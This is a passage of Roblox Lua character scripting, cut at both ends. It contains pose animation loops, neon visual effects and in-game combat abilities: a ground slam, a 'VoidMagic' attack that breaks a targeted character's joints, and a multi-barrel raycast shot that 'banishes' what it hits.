			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(120), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(150), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(180), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(210), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(240), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(270), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(-25), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.2, 0.5, -0.5) * ANGLES(RAD(75), RAD(0), RAD(70)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -0.5, -0.5) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(-25), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end	
		for i=0, 0.1, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(30), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.2, 0.5, -0.5) * ANGLES(RAD(75), RAD(0), RAD(70)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1.05, -0.5) * ANGLES(RAD(30), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end	
        local HITFLOOR,HITPOS = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 25*SIZE, Character)
        WACKYEFFECT({Time = 40,EffectType = "Sphere", Size = VT(0,0,0), Size2 = VT(25,25,25), Transparency = 0, Transparency2 = 1, CFrame = CF(HITPOS), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = 260435136, SoundPitch = 0.7, SoundVolume = 10})
        WACKYEFFECT({Time = 80,EffectType = "Sphere", Size = VT(0,0.55,0), Size2 = VT(30,0.55,30), Transparency = 0, Transparency2 = 1, CFrame = CF(HITPOS), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		ManualAoE(HITPOS,15,20,45,75,false)
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(30), RAD(0), RAD(0)), 3 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.2, 0.5, -0.5) * ANGLES(RAD(75), RAD(0), RAD(70)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 3 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1.05, -0.5) * ANGLES(RAD(30), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 3 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(30), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 3 / Animation_Speed)
		end	
		Rooted = true
		COMBO = 1
	end
	coroutine.resume(coroutine.create(function()
		for i = 1, 50 do
			Swait()
			if ATTACK == true then
				break
			end
		end
		if ATTACK == false then
			COMBO = 1
		end
	end))
	ATTACK = false
	Rooted = false
	EQUIPPED = false
end

function VoidMagic()
	local TARGET = Mouse.Target
	if TARGET ~= nil then
		if TARGET.Parent:FindFirstChildOfClass("Humanoid") then
			local HUM = TARGET.Parent:FindFirstChildOfClass("Humanoid")
			local ROOT = TARGET.Parent:FindFirstChild("HumanoidRootPart") or TARGET.Parent:FindFirstChild("Torso") or TARGET.Parent:FindFirstChild("UpperTorso")
			if ROOT and HUM.Health > 0 then
				local FOE = Mouse.Target.Parent
				local HEAD = FOE:FindFirstChild("Head")
				if HEAD then
					ATTACK = true
					Rooted = true
					RootPart.CFrame = ROOT.CFrame*CF(0,0,2)
					for _, c in pairs(FOE:GetChildren()) do
						if c.ClassName == "Part" then
							c.Anchored = true
						end
					end
					CreateSound(235097614, Torso, 1, 3, false)
					for i=0, 2, 0.1 / Animation_Speed do
						Swait()
				RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(3), RAD(0), RAD(-38)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(20 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(30)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.4, 0.35, 0) * ANGLES(RAD(180), RAD(1 - 2.5 * SIN(SINE / 12)), RAD(10)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.2) * ANGLES(RAD(-18), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1.1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(-2), RAD(0)), 1 / Animation_Speed)
					end
					if ROOT.Name == "HumanoidRootPart" then
						ROOT:remove()
					end
					FOE:BreakJoints()
					local POS = RootPart.Position
		            ApplyAoE(POS, 20, true)
					HEAD.CFrame = HEAD.CFrame  * ANGLES(RAD(0), RAD(0), RAD(0))
					CreateSound(1398471768, Head, 15, 1, false)
						    CreateSound(649634100, Torso, 10, 1)
		CreateSound(201858072, Torso, 10, 1)
		CreateSound(1396758921, Torso, 10, 1)
		WACKYEFFECT({EffectType = "Wave", Size = VT(8,8,8), Size2 = VT(20,20,20), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
				WACKYEFFECT({EffectType = "Skull", Size = VT(2,2,2), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
					ROOT.Anchored = false
					for i=0, 0.5, 0.1 / Animation_Speed do
						Swait()
				RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(3), RAD(0), RAD(-38)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(20 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(30)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(150), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.4, 0.35, 0) * ANGLES(RAD(180), RAD(1 - 2.5 * SIN(SINE / 12)), RAD(10)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.2) * ANGLES(RAD(-18), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1.1, -1 - 0.05 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(-70), RAD(0)) * ANGLES(RAD(0), RAD(-2), RAD(0)), 1 / Animation_Speed)
					end
					for _, c in pairs(FOE:GetChildren()) do
						if c.ClassName == "Part" then
							c.Anchored = false
						end
					end
					ATTACK = false
					Rooted = false
				end
			end
		end
	end
end

function Shot8()
	ATTACK = true
	Rooted = false
	repeat
		for i=0, 0.10, 0.1 / Animation_Speed do
			Swait()
			turnto(Mouse.Hit.p)
		    RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3) * ANGLES(RAD(-12), RAD(MRANDOM(-25,25)), RAD(0)), 2 / Animation_Speed)
		    Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-45), RAD(MRANDOM(-25,25)), RAD(0)), 2 / Animation_Speed)
		    RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * RIGHTSHOULDERC0, 2 / Animation_Speed)
		    LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * LEFTSHOULDERC0, 2 / Animation_Speed)
            RightHip.C0 = Clerp(RightHip.C0, CF(1, 0, -1) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 2 / Animation_Speed)
            LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.6, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)),2 / Animation_Speed)
		end
				local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Hole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = Hole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		local HIT,POS = CastProperRay(Holee.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Holee.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Holee.CFrame, MoveToPos = Holee.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Holee.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Holee.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Holee.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Hole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		local HIT,POS = CastProperRay(LeftHole2.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(LeftHole2.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole2.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole2.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		local HIT,POS = CastProperRay(LeftHole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(LeftHole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
